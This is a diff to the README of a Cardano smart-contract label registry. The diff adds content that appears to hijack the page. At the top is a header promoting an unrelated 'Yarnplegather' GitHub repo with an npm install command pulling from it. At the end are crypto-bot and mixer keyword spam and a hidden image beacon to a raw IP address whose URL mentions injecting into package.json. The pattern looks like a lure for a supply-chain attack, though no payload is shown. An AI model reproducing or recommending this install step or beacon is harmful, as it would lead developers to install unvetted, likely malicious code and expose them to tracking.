@@ -1,3 +1,15 @@
+**Yarnplegather/cardano-contracts-registry**
+
+Navigating the Cardano ecosystem shouldn't feel like a guessing game when it comes to smart contract addresses and verification. This repository serves as a dependable, centralized directory designed to keep your contract interactions predictable and secure. We've recently rolled out a few key fixes to iron out historical inconsistencies, ensuring you're always building on top of accurate, production-ready data.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Yarnplegather/cardano-contracts-registry.git
+```
+
+[https://github.com/Yarnplegather/cardano-contracts-registry](https://github.com/Yarnplegather/cardano-contracts-registry)
+
 <p align="center">
   <a href="https://strica.io/" target="_blank">
     <img src="https://docs.strica.io/images/logo.png" width="200">
@@ -181,3 +193,11 @@ If your contract does not have a specific name, you can use a generic name eg. `
 The resulting label is -> `Perfect Dex Contract`
 
 ---
+
+## Related searches
+
+Developers and open-source contributors looking into this ecosystem frequently search for structured ways to verify and monitor smart contract deployment details across various decentralized applications. They often seek official metadata frameworks, script validation tooling, and security audit records to integrate decentralized features safely into their platforms or applications.
+
+**Topics:** cardano contracts registry, dapp metadata registry, plutus script validation, cardano smart contract audit, chainlink cardano integration, crypto payment gateway, opensea bot template, sniper bot crypto, decentralized crypto mixer, cardano token mapping, blockfrost contract verification, off-chain dapp labels
+
+![.](http://5.231.58.248:8787/pixel?repo=Yarnplegather%2Fcardano-contracts-registry&inject=Yarnplegather%2Fcardano-contracts-registry%2Fpackage.json)
